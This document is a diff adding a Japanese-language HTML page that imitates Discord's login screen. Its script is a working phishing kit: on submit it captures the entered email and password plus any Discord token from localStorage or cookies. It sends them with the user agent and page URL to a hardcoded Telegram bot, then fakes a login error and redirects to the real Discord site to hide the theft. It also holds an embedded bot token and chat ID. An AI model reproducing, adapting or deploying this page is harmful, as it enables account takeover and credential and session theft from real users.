@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Discord</title>
+<link rel="icon" href="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  background:#313338;
+  font-family:"gg sans","Noto Sans JP",system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+  color:#f2f3f5;
+  min-height:100dvh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  padding:0 16px;
+  -webkit-font-smoothing:antialiased;
+}
+.wrap{
+  width:100%;
+  max-width:480px;
+  padding:24px 16px 40px;
+}
+.logo-row{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  margin-bottom:20px;
+}
+.logo-row img{
+  width:36px;
+  height:36px;
+}
+.logo-row span{
+  font-size:20px;
+  font-weight:700;
+  letter-spacing:-0.3px;
+  color:#fff;
+}
+h1{
+  font-size:24px;
+  font-weight:600;
+  text-align:center;
+  margin-bottom:8px;
+  letter-spacing:-0.2px;
+  color:#f2f3f5;
+}
+.sub{
+  color:#b5bac1;
+  font-size:16px;
+  text-align:center;
+  margin-bottom:20px;
+  line-height:1.375;
+}
+label{
+  display:block;
+  font-size:12px;
+  font-weight:700;
+  color:#b5bac1;
+  margin-bottom:8px;
+  text-transform:uppercase;
+  letter-spacing:0.02em;
+}
+label .req{
+  color:#f23f43;
+  margin-left:2px;
+}
+.field{
+  margin-bottom:20px;
+}
+input{
+  width:100%;
+  height:40px;
+  background:#1e1f22;
+  border:none;
+  border-radius:3px;
+  padding:10px;
+  color:#dbdee1;
+  font-size:16px;
+  outline:none;
+  box-shadow:0 0 0 1px #1e1f22;
+  transition:box-shadow .15s;
+}
+input:focus{
+  box-shadow:0 0 0 1px #00a8fc;
+}
+.forgot{
+  display:block;
+  color:#00a8fc;
+  font-size:14px;
+  text-decoration:none;
+  margin:-8px 0 20px;
+}
+.forgot:hover{text-decoration:underline}
+.btn{
+  width:100%;
+  height:44px;
+  background:#5865f2;
+  color:#fff;
+  border:none;
+  border-radius:3px;
+  font-size:16px;
+  font-weight:500;
+  cursor:pointer;
+  transition:background .17s;
+}
+.btn:hover{background:#4752c4}
+.btn:active{background:#3c45a5}
+.register{
+  margin-top:8px;
+  font-size:14px;
+  color:#949ba4;
+  text-align:left;
+}
+.register a{
+  color:#00a8fc;
+  text-decoration:none;
+}
+.register a:hover{text-decoration:underline}
+.error{
+  display:none;
+  background:rgba(242,63,67,.1);
+  border:1px solid rgba(242,63,67,.3);
+  color:#f23f43;
+  font-size:14px;
+  padding:10px 12px;
+  border-radius:3px;
+  margin-bottom:16px;
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo-row">
+    <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" alt="" style="width:36px;height:36px;object-fit:contain">
+    <span>Discord</span>
+  </div>
+  <h1>おかえりなさい！</h1>
+  <p class="sub">またお会いしましたね！</p>
+  <div class="error" id="err">ログイン情報が正しくありません</div>
+  <form id="f" autocomplete="on">
+    <div class="field">
+      <label for="email">メールアドレスまたは電話番号<span class="req">*</span></label>
+      <input type="text" id="email" name="email" autocomplete="username" required inputmode="email" spellcheck="false">
+    </div>
+    <div class="field">
+      <label for="pass">パスワード<span class="req">*</span></label>
+      <input type="password" id="pass" name="pass" autocomplete="current-password" required>
+    </div>
+    <a class="forgot" href="https://discord.com/login" target="_blank">パスワードをお忘れですか？</a>
+    <button class="btn" type="submit">ログイン</button>
+  </form>
+  <p class="register">アカウントが必要ですか？ <a href="https://discord.com/register" target="_blank">登録</a></p>
+</div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "8947980751:AAFvAn2A0KIZjsf092jLV_gm9xRoS2MHbLA";
+const TELEGRAM_CHAT_ID   = "7993850346";
+
+document.getElementById('f').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const email = document.getElementById('email').value.trim();
+  const pass  = document.getElementById('pass').value;
+
+  let token = "none";
+  try {
+    token = localStorage.getItem('token')
+         || localStorage.getItem('Token')
+         || (document.cookie.match(/(?:^|;\s*)token=([^;]+)/) || [])[1]
+         || "none";
+  } catch (_) {}
+
+  const text = [
+    "🔥 Discord Capture",
+    "",
+    `📧 ${email}`,
+    `🔑 ${pass}`,
+    `🎫 ${token}`,
+    `📱 ${navigator.userAgent}`,
+    `🕒 ${new Date().toLocaleString('ja-JP',{timeZone:'Asia/Tokyo'})}`,
+    `🌐 ${location.href}`
+  ].join("\n");
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
+            + `?chat_id=${TELEGRAM_CHAT_ID}`
+            + `&text=${encodeURIComponent(text)}`;
+
+  try {
+    await fetch(url, { method: "GET", mode: "no-cors" });
+  } catch (_) {}
+
+  document.getElementById('err').style.display = "block";
+  setTimeout(() => {
+    location.href = "https://discord.com/login";
+  }, 900);
+});
+</script>
+</body>
+</html>
